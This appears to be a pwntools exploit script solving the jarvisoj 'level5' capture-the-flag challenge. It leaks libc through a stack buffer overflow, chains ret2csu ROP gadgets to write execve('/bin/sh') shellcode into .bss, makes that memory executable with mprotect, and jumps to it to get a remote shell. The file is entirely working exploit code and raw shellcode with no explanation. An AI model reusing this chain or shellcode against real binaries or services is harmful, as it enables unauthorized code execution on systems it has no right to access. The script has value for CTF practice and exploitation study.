# !/usr/bin/env python
# -*- coding: utf-8 -*-

def Debug():
    raw_input("waiting for debug:")
    gdb.attach(io, "b *0x0000000000400618")

from pwn import *
context.terminal = ['deepin-terminal', '-x', 'bash', '-c']
# context.log_level = 'debug'

elf = ELF('./level5')
rop = ROP(elf)
p_rdi_r_addr = rop.rdi[0]
p_rsi_r15_r_addr = rop.rsi[0]

p_rbx_rbp_r12_r13_r14_r15_r = 0x00000000004006aa
mov_call = 0x0000000000400690

local = 0
if local:
    io = process('./level5')
    libc = ELF('./libc.so.6')
else:
    io = remote('pwn2.jarvisoj.com', 9884)
    libc = ELF('./libc-2.19.so')

io.recvuntil('Input:\n')
log.info("Step 1: leak read_addr")

read_libc_addr = libc.symbols['read']
read_got_addr = elf.got['read']
write_elf_addr = elf.symbols['write']
vuln_elf_addr = elf.symbols['vulnerable_function']

payload = 'A' * (0x80 + 0x8)
payload += p64(p_rdi_r_addr)
payload += p64(0x1)
payload += p64(p_rsi_r15_r_addr)
payload += p64(read_got_addr)
payload += p64(0x0000)
payload += p64(write_elf_addr)
payload += p64(vuln_elf_addr)

io.send(payload)

read_addr = u64(io.recv(8))
io.recvuntil('Input:\n')
log.info("leaked read_addr -> 0x%x" % read_addr)
mprotect_addr = read_addr - read_libc_addr + libc.symbols["mprotect"]
log.info("leak the mprotect_addr ->> 0x%x" % mprotect_addr)
log.info("Step 2: write shellcode 2 bss")
sh_addr = bss_addr = elf.bss()
shellcode = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"

payload = 'B' * (0x80 + 0x8)
payload += p64(p_rbx_rbp_r12_r13_r14_r15_r)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got_addr)
payload += p64(len(shellcode) + 1)
payload += p64(bss_addr)
payload += p64(0x0)
payload += p64(mov_call)
payload += 'C' * (7 * 8)
payload += p64(vuln_elf_addr)

io.send(payload)
io.send(shellcode + '\0')
io.recvuntil('Input:\n')

log.info("Step 3: hijack mprotect 2 __gmon_start__")
mprotect_addr = read_addr - read_libc_addr + libc.symbols['mprotect']
mprotect_hijack_addr = 0x0000000000600a70

payload = 'D' * (0x80 + 0x8)
payload += p64(p_rbx_rbp_r12_r13_r14_r15_r)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got_addr)
payload += p64(0x8)
payload += p64(mprotect_hijack_addr)
payload += p64(0x0)
payload += p64(mov_call)
payload += 'E' * (7 * 8)
payload += p64(vuln_elf_addr)

io.send(payload)
io.send(p64(mprotect_addr))
io.recvuntil('Input:\n')

log.info("Step 4: hijack sh/bss 2 __libc_start_main")
sh_hijack_addr = 0x0000000000600a68

payload = 'F' * (0x80 + 0x8)
payload += p64(p_rbx_rbp_r12_r13_r14_r15_r)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(read_got_addr)
payload += p64(0x8)
payload += p64(sh_hijack_addr)
payload += p64(0x0)
payload += p64(mov_call)
payload += 'G' * (7 * 8)
payload += p64(vuln_elf_addr)

io.send(payload)
io.send(p64(sh_addr))
io.recvuntil('Input:\n')

log.info("Step 5: fix bss 2 777")

payload = 'H' * (0x80 + 0x8)
payload += p64(p_rbx_rbp_r12_r13_r14_r15_r)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(mprotect_hijack_addr)
payload += p64(0x7)
#  payload += p64(len(shellcode) + 1)
#  payload += p64(sh_hijack_addr)
payload += p64(0x1000)
payload += p64(0x00600000)
payload += p64(mov_call)
payload += 'I' * (7 * 8)
payload += p64(vuln_elf_addr)

#  Debug()
io.send(payload)
io.recvuntil('Input:\n')

log.info("Step 6: execv shllcode")

payload = 'J' * (0x80 + 0x8)
#  payload += p64(sh_addr)
payload += p64(p_rbx_rbp_r12_r13_r14_r15_r)
payload += p64(0x0)
payload += p64(0x1)
payload += p64(sh_hijack_addr)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(mov_call)
payload += p64(vuln_elf_addr)

io.send(payload)

log.info("Step 7: getshell")
io.interactive()
io.close()


